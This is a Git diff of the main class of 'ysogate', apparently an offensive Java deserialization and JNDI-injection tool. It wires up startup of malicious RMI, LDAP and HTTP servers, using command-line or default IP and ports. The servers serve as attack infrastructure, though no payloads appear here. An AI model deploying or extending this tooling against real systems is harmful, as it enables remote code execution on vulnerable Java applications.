@@ -5,6 +5,10 @@ import java.io.OutputStream;
 import java.io.PrintWriter;
 import java.util.*;
 import com.h2tg.ysogate.config.Config;
+import com.h2tg.ysogate.config.JndiConfig;
+import com.h2tg.ysogate.exploit.server.LDAPServer;
+import com.h2tg.ysogate.exploit.server.RMIServer;
+import com.h2tg.ysogate.exploit.server.WebServer;
 import org.apache.commons.cli.*;
 import com.h2tg.ysogate.payloads.ObjectPayload;
 import com.h2tg.ysogate.payloads.ObjectPayload.Utils;
@@ -110,21 +114,37 @@ public class Main {
             return;
         }
 
-        String[] requiredOpts = {"ip"};
-        for (String opt : requiredOpts) {
-            if (!cmdLine.hasOption(opt)) {
-                printUsage(jndiOptions);
-                throw new ParseException("JNDI mode requires -i options.");
-            }
-        }
+//        String[] requiredOpts = {"ip"};
+//        for (String opt : requiredOpts) {
+//            if (!cmdLine.hasOption(opt)) {
+//                printUsage(jndiOptions);
+//                throw new ParseException("JNDI mode requires -i options.");
+//            }
+//        }
 
         printInfo("Starting JNDI server...");
         // TODO: Implement JNDI server startup logic
-//        printInfo("IP: " + cmdLine.getOptionValue("ip"));
-//        printInfo("RMI Port: " + cmdLine.getOptionValue("rp"));
-//        printInfo("LDAP Port: " + cmdLine.getOptionValue("lp"));
-//        printInfo("HTTP Port: " + cmdLine.getOptionValue("hp"));
-//        printInfo("URL: " + cmdLine.getOptionValue("u"));
+        String ip = cmdLine.getOptionValue("ip") == null ? JndiConfig.ip : cmdLine.getOptionValue("ip");
+        int rmiPort = cmdLine.getOptionValue("rp") == null ? JndiConfig.rmiPort : Integer.parseInt(cmdLine.getOptionValue("rp"));
+        int ldapPort = cmdLine.getOptionValue("lp") == null ? JndiConfig.ldapPort : Integer.parseInt(cmdLine.getOptionValue("lp"));
+        int httpPort = cmdLine.getOptionValue("hp") == null ? JndiConfig.httpPort : Integer.parseInt(cmdLine.getOptionValue("hp"));
+
+//        printInfo("JNDI Server IP: " + ip);
+//        printInfo("RMI Port: " + rmiPort);
+//        printInfo("LDAP Port: " + ldapPort);
+//        printInfo("HTTP Port: " + httpPort);
+
+        RMIServer rmiServer = new RMIServer(ip, rmiPort);
+        LDAPServer ldapServer = new LDAPServer(ip, ldapPort);
+        WebServer webServer = new WebServer(ip, httpPort);
+
+        Thread rmiThread = new Thread(rmiServer);
+        Thread ldapThread = new Thread(ldapServer);
+        Thread webThread = new Thread(webServer);
+
+        rmiThread.start();
+        ldapThread.start();
+        webThread.start();
     }
 
     private static void generatePayload(String payloadType, String parameters) {
@@ -189,7 +209,7 @@ public class Main {
         }
     }
 
-    private static void printInfo(String message) {
+    public static void printInfo(String message) {
         System.out.println(PREFIX + message);
     }
 
